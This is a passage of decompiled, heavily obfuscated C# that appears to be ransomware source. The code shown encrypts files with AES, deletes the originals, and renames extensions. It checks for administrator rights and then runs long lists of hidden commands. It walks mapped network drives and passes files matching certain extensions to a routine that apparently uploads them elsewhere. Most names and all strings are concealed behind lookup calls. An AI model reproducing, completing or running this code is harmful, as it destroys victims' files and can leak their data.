		byte[] bytes = TzDtpbVJUP.XeximicAtk(File.ReadAllBytes(JtKutskkjnJ), cuNUCjpZvCIgyI, VuTXkwvzLJ);
		File.WriteAllBytes(JtKutskkjnJ, bytes);
		bXnXKaTzlpeizP++;
	}

	private static void yGIPnmDWDLY(string string_0, string string_1, byte[] byte_0)
	{
		SUkdGETNoCP CS_0024_003C_003E8__locals0 = new SUkdGETNoCP();
		CS_0024_003C_003E8__locals0.hBmTXxzEOo = string_0;
		CS_0024_003C_003E8__locals0.VcUtNNGzkJCI = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string vcUtNNGzkJCI = CS_0024_003C_003E8__locals0.VcUtNNGzkJCI;
			FileStream fileStream = new FileStream(vcUtNNGzkJCI, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (rDydiOTZjcpMjk == getString_0(107396830))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.hBmTXxzEOo, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.hBmTXxzEOo, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.hBmTXxzEOo, FileMode.Open);
				int num2;
				while ((num2 = fileStream2.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num2);
				}
				fileStream2.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.VcUtNNGzkJCI.Length > 0)
				{
					if (OULbCWoifC == getString_0(107396830))
					{
						FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.hBmTXxzEOo, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in QrfGnpJnAuCjH)
						{
							if (CS_0024_003C_003E8__locals0.hBmTXxzEOo.ToLower().EndsWith(item) && cfLqyLJDABPGnW == getString_0(107396830))
							{
								if (Convert.ToInt32(IAXzEIcMsJCbe) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										chuLHDnVuoGm.XEbKwrzWPjZipB(getString_0(107386441), getString_0(107386404), getString_0(107386423), CS_0024_003C_003E8__locals0.hBmTXxzEOo);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.hBmTXxzEOo.ToLower().EndsWith(item) && cfLqyLJDABPGnW == getString_0(107396725))
							{
								try
								{
									chuLHDnVuoGm.XEbKwrzWPjZipB(getString_0(107386441), getString_0(107386404), getString_0(107386423), CS_0024_003C_003E8__locals0.hBmTXxzEOo);
								}
								catch
								{
								}
							}
						}
						fileStream3.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.hBmTXxzEOo);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.VcUtNNGzkJCI.EndsWith(getString_0(107382423)))
					{
						File.Move(CS_0024_003C_003E8__locals0.VcUtNNGzkJCI, CS_0024_003C_003E8__locals0.VcUtNNGzkJCI.Replace(getString_0(107382423), getString_0(107386328)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.VcUtNNGzkJCI))
							{
								File.Delete(CS_0024_003C_003E8__locals0.VcUtNNGzkJCI);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (XtQtDAAqcssaA)
			{
				try
				{
					File.AppendAllText(IuaKWfBuBpJ, getString_0(107383160) + CS_0024_003C_003E8__locals0.hBmTXxzEOo + getString_0(107382414) + ex2.Message + getString_0(107395755));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__5()
	{
		List<string> source = lwXnKcBqjUg;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
			{
				gzgGVgooFWELQWZ(VzYMPTFsHuw(getString_0(107382841)), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			List<string> source2 = cQAeQsXjtYRcv;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
				{
					gzgGVgooFWELQWZ(VzYMPTFsHuw(getString_0(107384399)), string_0);
				};
			}
			Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		}
		List<string> zwCTwpgPpCNTnG = ZwCTwpgPpCNTnG;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
			{
				gzgGVgooFWELQWZ(VzYMPTFsHuw(getString_0(107382860)), string_0);
			};
		}
		Parallel.ForEach(zwCTwpgPpCNTnG, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		if (ZYkRnxhSkNKv == getString_0(107396830))
		{
			string[] source3 = xzbVbgXgcctL;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
				{
					gzgGVgooFWELQWZ(VzYMPTFsHuw(getString_0(107382860)), getString_0(107382835) + string_0 + getString_0(107382826));
				};
			}
			Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
		}
		if (!uGgsLnwioPEKG().Contains(getString_0(107382546)))
		{
			RTrKmYslaoZrDdzW(CdlcYQkbZfgX);
		}
		else
		{
			List<string> hwMUOlrDhqcCP = HwMUOlrDhqcCP;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
				{
					gzgGVgooFWELQWZ(VzYMPTFsHuw(tQZMOZqkYus(getString_0(107382789))), string_0);
				};
			}
			Parallel.ForEach(hwMUOlrDhqcCP, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
		}
		List<string> fGNmVQpFiIbRC = FGNmVQpFiIbRC;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
			{
				gzgGVgooFWELQWZ(VzYMPTFsHuw(getString_0(107382796)), string_0);
			};
		}
		Parallel.ForEach(fGNmVQpFiIbRC, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
	}

	private static void _003CMain_003Eb__6(string string_0)
	{
		gzgGVgooFWELQWZ(VzYMPTFsHuw(getString_0(107382841)), string_0);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		gzgGVgooFWELQWZ(VzYMPTFsHuw(getString_0(107384399)), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		gzgGVgooFWELQWZ(VzYMPTFsHuw(getString_0(107382860)), string_0);
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		gzgGVgooFWELQWZ(VzYMPTFsHuw(getString_0(107382860)), getString_0(107382835) + string_0 + getString_0(107382826));
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		gzgGVgooFWELQWZ(VzYMPTFsHuw(tQZMOZqkYus(getString_0(107382789))), string_0);
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		gzgGVgooFWELQWZ(VzYMPTFsHuw(getString_0(107382796)), string_0);
	}

	private static void _003CMapDrv_003Eb__19(string string_0)
	{
		LdjHjnvKojp CS_0024_003C_003E8__locals0 = new LdjHjnvKojp();
		CS_0024_003C_003E8__locals0.dRGYTxVjrZ = string_0;
		if ((!CS_0024_003C_003E8__locals0.dRGYTxVjrZ.StartsWith(getString_0(107382747)) && !CS_0024_003C_003E8__locals0.dRGYTxVjrZ.StartsWith(getString_0(107382774)) && !CS_0024_003C_003E8__locals0.dRGYTxVjrZ.StartsWith(getString_0(107382765)) && !CS_0024_003C_003E8__locals0.dRGYTxVjrZ.StartsWith(getString_0(107386328))) || !vUKwidQPcZK.SVqnxxkNCtz(CS_0024_003C_003E8__locals0.dRGYTxVjrZ))
		{
			return;
		}
		try
		{
			Thread.Sleep(PtQKcSkXgtK);
			UnsVNkGvmiq.Add(getString_0(107384680) + CS_0024_003C_003E8__locals0.dRGYTxVjrZ + getString_0(107382720));
			try
			{
				if (vgTZYvMerotpU)
				{
					Console.WriteLine(getString_0(107384680) + CS_0024_003C_003E8__locals0.dRGYTxVjrZ + getString_0(107382720));
				}
			}
			catch
			{
			}
			Parallel.For(68, 91, delegate(int int_0)
			{
				Thread.Sleep(PtQKcSkXgtK);
				UnsVNkGvmiq.Add(LdjHjnvKojp.getString_0(107384686) + CS_0024_003C_003E8__locals0.dRGYTxVjrZ + LdjHjnvKojp.getString_0(107396758) + (char)int_0 + LdjHjnvKojp.getString_0(107400240));
				try
				{
					if (vgTZYvMerotpU)
					{
						Console.WriteLine(LdjHjnvKojp.getString_0(107384686) + CS_0024_003C_003E8__locals0.dRGYTxVjrZ + LdjHjnvKojp.getString_0(107396758) + (char)int_0 + LdjHjnvKojp.getString_0(107400240));
					}
				}
				catch
				{
				}
			});
		}
		catch
		{
		}
	}

	static UzNyTypkvLt()
	{
		Strings.CreateGetStringDelegate(typeof(UzNyTypkvLt));
		wZViDAUBvyJWckg = getString_0(107385583);
		LGcIAPIHUXZNO = null;
		MIxirqlACCH = getString_0(107396725);
		YsIgwUYIkhJk = getString_0(107382743);
		UnsVNkGvmiq = new List<string>();
		gRQbJrWftCBRaA = new List<string>();
		aOjnCzAamNo = getString_0(107396725);
		yifqLwxnUift = getString_0(107386328);
		lASimeaIGcCh = getString_0(107386328);
		kqGxspAqmKwYfMRE = getString_0(107386328);
		fOdqhhYcGXYCQhD = getString_0(107396725);
		kUDFpFbecfvt = 0;
		nUcCUJIepUVWBM = getString_0(107396725);
		VRKQUcDkAXFBsw = getString_0(107396725);
		IbngcvXVqUay = getString_0(107396725);
		FDksBsxiqNIP = getString_0(107382730);
		axNvoMiUlTfVi = getString_0(107396725);
		uUqLStTTRWpfB = getString_0(107396725);
		MWBxDJHVzVVlkkG = getString_0(107396725);
		VvEXsnSpTne = getString_0(107396725);
		lsYvEarxPuHJY = new List<string>
		{
			VzYMPTFsHuw(getString_0(107382693)),
			VzYMPTFsHuw(getString_0(107382708)),
			VzYMPTFsHuw(getString_0(107382651)),
			VzYMPTFsHuw(getString_0(107382666)),
			VzYMPTFsHuw(getString_0(107382129)),
			VzYMPTFsHuw(getString_0(107382072)),
			VzYMPTFsHuw(getString_0(107382055)),
			VzYMPTFsHuw(getString_0(107382062)),
			VzYMPTFsHuw(getString_0(107382037)),
			VzYMPTFsHuw(getString_0(107381980)),
			VzYMPTFsHuw(getString_0(107381995)),
			VzYMPTFsHuw(getString_0(107381970)),
			VzYMPTFsHuw(getString_0(107381913))
		};
		DhgHRwHTnLl = new List<string>();
		GVjmRveZBheoB = getString_0(107396725);
		kFEPtOoFLrARK = getString_0(107396725);
		JsjzvciSYHGaNPD = getString_0(107396725);
		aacDzVOnoKU = new List<string>();
		RXIvcNxQCBkNLNLT = getString_0(107396725);
		ElBXdvdNPyUDl = getString_0(107381888);
		nAhrhGGnjLvL = getString_0(107396725);
		nQCoBwwBsQBI = getString_0(107396725);
		cQAeQsXjtYRcv = new List<string>
		{
			VzYMPTFsHuw(getString_0(107382383)),
			VzYMPTFsHuw(getString_0(107382350)),
			VzYMPTFsHuw(getString_0(107382317)),
			VzYMPTFsHuw(getString_0(107382284)),
			VzYMPTFsHuw(getString_0(107382251)),
			VzYMPTFsHuw(getString_0(107382222)),
			VzYMPTFsHuw(getString_0(107382165)),
			VzYMPTFsHuw(getString_0(107381592)),
			VzYMPTFsHuw(getString_0(107381579)),
			VzYMPTFsHuw(getString_0(107381514)),
			VzYMPTFsHuw(getString_0(107381481)),
			VzYMPTFsHuw(getString_0(107381448)),
			VzYMPTFsHuw(getString_0(107381383)),
			VzYMPTFsHuw(getString_0(107381386)),
			VzYMPTFsHuw(getString_0(107381869)),
			VzYMPTFsHuw(getString_0(107381796)),
			VzYMPTFsHuw(getString_0(107381755)),
			VzYMPTFsHuw(getString_0(107381698)),
			VzYMPTFsHuw(getString_0(107381681)),
			VzYMPTFsHuw(getString_0(107381648)),
			VzYMPTFsHuw(getString_0(107381107)),
			VzYMPTFsHuw(getString_0(107381066)),
			VzYMPTFsHuw(getString_0(107380993)),
			VzYMPTFsHuw(getString_0(107380960)),
			VzYMPTFsHuw(getString_0(107380943)),
			VzYMPTFsHuw(getString_0(107380886)),
			VzYMPTFsHuw(getString_0(107381357)),
			VzYMPTFsHuw(getString_0(107381328)),
			VzYMPTFsHuw(getString_0(107381255)),
			VzYMPTFsHuw(getString_0(107381230)),
			VzYMPTFsHuw(getString_0(107381165)),
			VzYMPTFsHuw(getString_0(107413364)),
			VzYMPTFsHuw(getString_0(107413299)),
			VzYMPTFsHuw(getString_0(107413218)),
			VzYMPTFsHuw(getString_0(107413153)),
			VzYMPTFsHuw(getString_0(107413128)),
			VzYMPTFsHuw(getString_0(107413575)),
			VzYMPTFsHuw(getString_0(107413534)),
			VzYMPTFsHuw(getString_0(107413525)),
			VzYMPTFsHuw(getString_0(107413480)),
			VzYMPTFsHuw(getString_0(107413451)),
			VzYMPTFsHuw(getString_0(107413386)),
			VzYMPTFsHuw(getString_0(107412801)),
			VzYMPTFsHuw(getString_0(107412768)),
			VzYMPTFsHuw(getString_0(107412759)),
			VzYMPTFsHuw(getString_0(107412678)),
			VzYMPTFsHuw(getString_0(107412633)),
			VzYMPTFsHuw(getString_0(107413104)),
			VzYMPTFsHuw(getString_0(107413027)),
			VzYMPTFsHuw(getString_0(107413014)),
			VzYMPTFsHuw(getString_0(107412969)),
			VzYMPTFsHuw(getString_0(107412896)),
			VzYMPTFsHuw(getString_0(107412343)),
			VzYMPTFsHuw(getString_0(107412282)),
			VzYMPTFsHuw(getString_0(107412273)),
			VzYMPTFsHuw(getString_0(107412208)),
			VzYMPTFsHuw(getString_0(107412131)),
			VzYMPTFsHuw(getString_0(107412102)),
			VzYMPTFsHuw(getString_0(107412569)),
			VzYMPTFsHuw(getString_0(107412504)),
			VzYMPTFsHuw(getString_0(107412475)),
			VzYMPTFsHuw(getString_0(107412418)),
			VzYMPTFsHuw(getString_0(107412353)),
			VzYMPTFsHuw(getString_0(107411800)),
			VzYMPTFsHuw(getString_0(107411771)),
			VzYMPTFsHuw(getString_0(107411762)),
			VzYMPTFsHuw(getString_0(107411649)),
			VzYMPTFsHuw(getString_0(107411588)),
			VzYMPTFsHuw(getString_0(107412027)),
			VzYMPTFsHuw(getString_0(107412014)),
			VzYMPTFsHuw(getString_0(107411981)),
			VzYMPTFsHuw(getString_0(107411908)),
			VzYMPTFsHuw(getString_0(107411863)),
			VzYMPTFsHuw(getString_0(107411306)),
			VzYMPTFsHuw(getString_0(107411217)),
			VzYMPTFsHuw(getString_0(107411136)),
			VzYMPTFsHuw(getString_0(107411107)),
			VzYMPTFsHuw(getString_0(107411066)),
			VzYMPTFsHuw(getString_0(107411513)),
			VzYMPTFsHuw(getString_0(107411496)),
			VzYMPTFsHuw(getString_0(107411439)),
			VzYMPTFsHuw(getString_0(107411406)),
			VzYMPTFsHuw(getString_0(107411345)),
			VzYMPTFsHuw(getString_0(107410744)),
			VzYMPTFsHuw(getString_0(107413128)),
			VzYMPTFsHuw(getString_0(107410687)),
			VzYMPTFsHuw(getString_0(107410678)),
			VzYMPTFsHuw(getString_0(107410557)),
			VzYMPTFsHuw(getString_0(107411056)),
			VzYMPTFsHuw(getString_0(107410995)),
			VzYMPTFsHuw(getString_0(107410938)),
			VzYMPTFsHuw(getString_0(107410925)),
			VzYMPTFsHuw(getString_0(107410844)),
			VzYMPTFsHuw(getString_0(107381230)),
			VzYMPTFsHuw(getString_0(107410267)),
			VzYMPTFsHuw(getString_0(107410258)),
			VzYMPTFsHuw(getString_0(107410169)),
			VzYMPTFsHuw(getString_0(107381165)),
			VzYMPTFsHuw(getString_0(107410128)),
			VzYMPTFsHuw(getString_0(107410047)),
			VzYMPTFsHuw(getString_0(107410470)),
			VzYMPTFsHuw(getString_0(107410405)),
			VzYMPTFsHuw(getString_0(107410388)),
			VzYMPTFsHuw(getString_0(107413299)),
			VzYMPTFsHuw(getString_0(107409767)),
			VzYMPTFsHuw(getString_0(107413575)),
			VzYMPTFsHuw(getString_0(107413218)),
			VzYMPTFsHuw(getString_0(107409734)),
			VzYMPTFsHuw(getString_0(107409709)),
			VzYMPTFsHuw(getString_0(107413153)),
			VzYMPTFsHuw(getString_0(107409676)),
			VzYMPTFsHuw(getString_0(107409595)),
			VzYMPTFsHuw(getString_0(107409578)),
			VzYMPTFsHuw(getString_0(107381255)),
			VzYMPTFsHuw(getString_0(107409553)),
			VzYMPTFsHuw(getString_0(107409988)),
			VzYMPTFsHuw(getString_0(107409959)),
			VzYMPTFsHuw(getString_0(107409962)),
			VzYMPTFsHuw(getString_0(107409885)),
			VzYMPTFsHuw(getString_0(107409852)),
			VzYMPTFsHuw(getString_0(107409827)),
			VzYMPTFsHuw(getString_0(107409814)),
			VzYMPTFsHuw(getString_0(107409245)),
			VzYMPTFsHuw(getString_0(107409236)),
			VzYMPTFsHuw(getString_0(107409159)),
			VzYMPTFsHuw(getString_0(107409142)),
			VzYMPTFsHuw(getString_0(107409053)),
			VzYMPTFsHuw(getString_0(107409020)),
			VzYMPTFsHuw(getString_0(107409519)),
			VzYMPTFsHuw(getString_0(107409486)),
			VzYMPTFsHuw(getString_0(107409413)),
			VzYMPTFsHuw(getString_0(107381328)),
			VzYMPTFsHuw(getString_0(107409142)),
			VzYMPTFsHuw(getString_0(107409372)),
			VzYMPTFsHuw(getString_0(107409343)),
			VzYMPTFsHuw(getString_0(107409314)),
			VzYMPTFsHuw(getString_0(107409297)),
			VzYMPTFsHuw(getString_0(107408744)),
			VzYMPTFsHuw(getString_0(107408683)),
			VzYMPTFsHuw(getString_0(107408578)),
			VzYMPTFsHuw(getString_0(107408549)),
			VzYMPTFsHuw(getString_0(107408516)),
			VzYMPTFsHuw(getString_0(107408955)),
			VzYMPTFsHuw(getString_0(107408926)),
			VzYMPTFsHuw(getString_0(107408913)),
			VzYMPTFsHuw(getString_0(107408848)),
			VzYMPTFsHuw(getString_0(107408815)),
			VzYMPTFsHuw(getString_0(107408226)),
			VzYMPTFsHuw(getString_0(107408165)),
			VzYMPTFsHuw(getString_0(107408132)),
			VzYMPTFsHuw(getString_0(107408119)),
			VzYMPTFsHuw(getString_0(107408054)),
			VzYMPTFsHuw(getString_0(107408021)),
			VzYMPTFsHuw(getString_0(107408492)),
			VzYMPTFsHuw(getString_0(107408411)),
			VzYMPTFsHuw(getString_0(107380943)),
			VzYMPTFsHuw(getString_0(107408382)),
			VzYMPTFsHuw(getString_0(107408325)),
			VzYMPTFsHuw(getString_0(107408284)),
			VzYMPTFsHuw(getString_0(107408271)),
			VzYMPTFsHuw(getString_0(107407686)),
			VzYMPTFsHuw(getString_0(107407641)),
			VzYMPTFsHuw(getString_0(107407580)),
			VzYMPTFsHuw(getString_0(107407563)),
			VzYMPTFsHuw(getString_0(107407482)),
			VzYMPTFsHuw(getString_0(107407937)),
			VzYMPTFsHuw(getString_0(107407912)),
			VzYMPTFsHuw(getString_0(107407835)),
			VzYMPTFsHuw(getString_0(107407826)),
			VzYMPTFsHuw(getString_0(107407737)),
			VzYMPTFsHuw(getString_0(107380886)),
			VzYMPTFsHuw(getString_0(107407184)),
			VzYMPTFsHuw(getString_0(107407155)),
			VzYMPTFsHuw(getString_0(107407122)),
			VzYMPTFsHuw(getString_0(107407081)),
			VzYMPTFsHuw(getString_0(107407052)),
			VzYMPTFsHuw(getString_0(107380960)),
			VzYMPTFsHuw(getString_0(107406979)),
			VzYMPTFsHuw(getString_0(107407474)),
			VzYMPTFsHuw(getString_0(107407445)),
			VzYMPTFsHuw(getString_0(107412475)),
			VzYMPTFsHuw(getString_0(107407412)),
			VzYMPTFsHuw(getString_0(107407445)),
			VzYMPTFsHuw(getString_0(107407383)),
			VzYMPTFsHuw(getString_0(107407322)),
			VzYMPTFsHuw(getString_0(107407293)),
			VzYMPTFsHuw(getString_0(107407276)),
			VzYMPTFsHuw(getString_0(107406683)),
			VzYMPTFsHuw(getString_0(107406674)),
			VzYMPTFsHuw(getString_0(107406613)),
			VzYMPTFsHuw(getString_0(107406552)),
			VzYMPTFsHuw(getString_0(107406543)),
			VzYMPTFsHuw(getString_0(107406466)),
			VzYMPTFsHuw(getString_0(107406965)),
			VzYMPTFsHuw(getString_0(107406932)),
			VzYMPTFsHuw(getString_0(107406843)),
			VzYMPTFsHuw(getString_0(107406830)),
			VzYMPTFsHuw(getString_0(107406773)),
			VzYMPTFsHuw(getString_0(107406740)),
			VzYMPTFsHuw(getString_0(107406187)),
			VzYMPTFsHuw(getString_0(107406158)),
			VzYMPTFsHuw(getString_0(107406097)),
			VzYMPTFsHuw(getString_0(107406064)),
			VzYMPTFsHuw(getString_0(107406007)),
			VzYMPTFsHuw(getString_0(107405966)),
			VzYMPTFsHuw(getString_0(107406397)),
			VzYMPTFsHuw(getString_0(107406364)),
			VzYMPTFsHuw(getString_0(107406347)),
			VzYMPTFsHuw(getString_0(107406270)),
			VzYMPTFsHuw(getString_0(107406253)),
			VzYMPTFsHuw(getString_0(107405664)),
			VzYMPTFsHuw(getString_0(107405647)),
			VzYMPTFsHuw(getString_0(107405614)),
			VzYMPTFsHuw(getString_0(107405541)),
			VzYMPTFsHuw(getString_0(107405500)),
			VzYMPTFsHuw(getString_0(107405487)),
			VzYMPTFsHuw(getString_0(107408744)),
			VzYMPTFsHuw(getString_0(107405454)),
			VzYMPTFsHuw(getString_0(107405893)),
			VzYMPTFsHuw(getString_0(107405868)),
			VzYMPTFsHuw(getString_0(107405839)),
			VzYMPTFsHuw(getString_0(107405806)),
			VzYMPTFsHuw(getString_0(107405773)),
			VzYMPTFsHuw(getString_0(107405692)),
			VzYMPTFsHuw(getString_0(107405151)),
			VzYMPTFsHuw(getString_0(107405138)),
			VzYMPTFsHuw(getString_0(107405061)),
			VzYMPTFsHuw(getString_0(107405020)),
			VzYMPTFsHuw(getString_0(107404963)),
			VzYMPTFsHuw(getString_0(107404946)),
			VzYMPTFsHuw(getString_0(107405429)),
			VzYMPTFsHuw(getString_0(107405384))
		};
		lwXnKcBqjUg = new List<string>
		{
			VzYMPTFsHuw(getString_0(107405311)),
			VzYMPTFsHuw(getString_0(107405294)),
			VzYMPTFsHuw(getString_0(107405213)),
			VzYMPTFsHuw(getString_0(107405196)),
			VzYMPTFsHuw(getString_0(107404603)),
			VzYMPTFsHuw(getString_0(107404538)),
			VzYMPTFsHuw(getString_0(107404493)),
			VzYMPTFsHuw(getString_0(107404432))
		};
		ZwCTwpgPpCNTnG = new List<string>
		{
			VzYMPTFsHuw(getString_0(107404887)),
			VzYMPTFsHuw(getString_0(107404854)),
			VzYMPTFsHuw(getString_0(107404809)),
			VzYMPTFsHuw(getString_0(107404728)),
			VzYMPTFsHuw(getString_0(107404727)),
			VzYMPTFsHuw(getString_0(107404134)),
			VzYMPTFsHuw(getString_0(107404089)),
			VzYMPTFsHuw(getString_0(107404056)),
			VzYMPTFsHuw(getString_0(107404055)),
			VzYMPTFsHuw(getString_0(107404022)),
			VzYMPTFsHuw(getString_0(107403989)),
			VzYMPTFsHuw(getString_0(107403956)),
			VzYMPTFsHuw(getString_0(107403915)),
			VzYMPTFsHuw(getString_0(107404354)),
			VzYMPTFsHuw(getString_0(107404341)),
			VzYMPTFsHuw(getString_0(107404308)),
			VzYMPTFsHuw(getString_0(107404267)),
			VzYMPTFsHuw(getString_0(107404234)),
			VzYMPTFsHuw(getString_0(107404161)),
			VzYMPTFsHuw(getString_0(107403608)),
			VzYMPTFsHuw(getString_0(107403607)),
			VzYMPTFsHuw(getString_0(107403566)),
			VzYMPTFsHuw(getString_0(107403533)),
			VzYMPTFsHuw(getString_0(107404887)),
			VzYMPTFsHuw(getString_0(107403460)),
			VzYMPTFsHuw(getString_0(107403419)),
			VzYMPTFsHuw(getString_0(107403406)),
			VzYMPTFsHuw(getString_0(107403885)),
			VzYMPTFsHuw(getString_0(107403812)),
			VzYMPTFsHuw(getString_0(107403771)),
			VzYMPTFsHuw(getString_0(107403738)),
			VzYMPTFsHuw(getString_0(107403729)),
			VzYMPTFsHuw(getString_0(107403688)),
			VzYMPTFsHuw(getString_0(107404854)),
			VzYMPTFsHuw(getString_0(107403103)),
			VzYMPTFsHuw(getString_0(107404809)),
			VzYMPTFsHuw(getString_0(107403070)),
			VzYMPTFsHuw(getString_0(107403037)),
			VzYMPTFsHuw(getString_0(107403028)),
			VzYMPTFsHuw(getString_0(107402995)),
			VzYMPTFsHuw(getString_0(107402954)),
			VzYMPTFsHuw(getString_0(107402881)),
			VzYMPTFsHuw(getString_0(107403360)),
			VzYMPTFsHuw(getString_0(107403327)),
			VzYMPTFsHuw(getString_0(107403318)),
			VzYMPTFsHuw(getString_0(107403277)),
			VzYMPTFsHuw(getString_0(107403204))
		};
		HwMUOlrDhqcCP = new List<string>
		{
			VzYMPTFsHuw(tQZMOZqkYus(getString_0(107403163))),
			VzYMPTFsHuw(tQZMOZqkYus(getString_0(107403146))),
			VzYMPTFsHuw(tQZMOZqkYus(getString_0(107402541))),
			VzYMPTFsHuw(tQZMOZqkYus(getString_0(107402444))),
			VzYMPTFsHuw(tQZMOZqkYus(getString_0(107402863))),
			VzYMPTFsHuw(tQZMOZqkYus(getString_0(107402766))),
			VzYMPTFsHuw(tQZMOZqkYus(getString_0(107402673))),
			VzYMPTFsHuw(getString_0(107402064)),
			VzYMPTFsHuw(tQZMOZqkYus(getString_0(107401971))),
			VzYMPTFsHuw(getString_0(107401874)),
			VzYMPTFsHuw(getString_0(107402293)),
			VzYMPTFsHuw(getString_0(107402196)),
			VzYMPTFsHuw(getString_0(107401591)),
			VzYMPTFsHuw(tQZMOZqkYus(getString_0(107403163)))
		};
		CdlcYQkbZfgX = VzYMPTFsHuw(getString_0(107401494));
		FGNmVQpFiIbRC = new List<string>
		{
			VzYMPTFsHuw(getString_0(107401349)),
			VzYMPTFsHuw(getString_0(107401667)),
			VzYMPTFsHuw(getString_0(107400961)),
			VzYMPTFsHuw(getString_0(107401279)),
			VzYMPTFsHuw(getString_0(107401085)),
			VzYMPTFsHuw(getString_0(107400379))
		};
		vCnEwZnUkyEf = new List<string>
		{
			VzYMPTFsHuw(getString_0(107400697)),
			VzYMPTFsHuw(getString_0(107400636)),
			VzYMPTFsHuw(getString_0(107400575))
		};
		dzXbLfIlxqQ = getString_0(107396725);
		KdHfizAWJPBxZw = getString_0(107396725);
		dpYJGRudJnY = new DateTime(2000, 1, 1);
		JJZijoXiUb = new DateTime(2100, 1, 1);
		yKirRorQtiUWa = getString_0(107396830);
		OLieTsrCJKKkG = getString_0(107382517);
		onexTuCIHp = getString_0(107396725);
		AAzsszDLtBArMH = getString_0(107396725);
		WTLzBflxaiHP = getString_0(107396725);
		LvBDhURvzQmNBGxJkM = getString_0(107396830);
		DdoPVfjRRWF = getString_0(107396725);
		OULbCWoifC = getString_0(107396725);
		QrfGnpJnAuCjH = new List<string>
		{
			getString_0(107395375),
			getString_0(107395601),
			getString_0(107395409),
			getString_0(107395450)
		};
		cfLqyLJDABPGnW = getString_0(107396725);
		IAXzEIcMsJCbe = getString_0(107400002);
		HOQqgSjsqWjS = getString_0(107396725);
		AsHJUQfrCAxHnEB = getString_0(107396725);
		NYOvhfGfpZr = getString_0(107396725);
		tgEjSEnjUdT = string.Empty;
		qsltNPUduYmpyr = getString_0(107396725);
		JizROfsTywT = getString_0(107396725);
		MkHTMejTyEeX = getString_0(107396725);
		TqelslmXbJvdcP = getString_0(107386328);
		zAuvhVvxsCxr = getString_0(107386328);
		sFGarQNRmknpg = getString_0(107396725);
		FfRBXtJzfTfpvsd = getString_0(107396830);
		aKVrenHUiYNV = getString_0(107396830);
		skxIDVgRVdAms = getString_0(107396725);
